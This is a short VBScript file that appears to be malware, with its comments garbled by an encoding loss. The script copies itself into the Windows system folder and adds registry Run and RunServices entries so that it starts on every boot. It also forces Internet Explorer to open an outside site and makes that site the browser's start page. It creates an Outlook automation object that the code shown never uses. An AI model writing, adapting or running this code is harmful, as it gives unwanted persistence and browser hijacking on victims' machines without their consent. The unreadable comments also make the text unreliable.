'            =======> ��� ������ <=======

'      ���������� ����������(���� ����� �� ����������)
Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")


' ����������� ��� ������ ������������
Set File2 = f.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' ������� �� ���� "http:\\goldenwork.ucoz.ru/load"
ie.Visible = True
ie.Navigate "http:\\goldenwork.ucoz.ru/load"

' ������� �������� �������� "http:\\goldenwork.ucoz.ru/load"
s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\goldenwork.ucoz.ru/load"

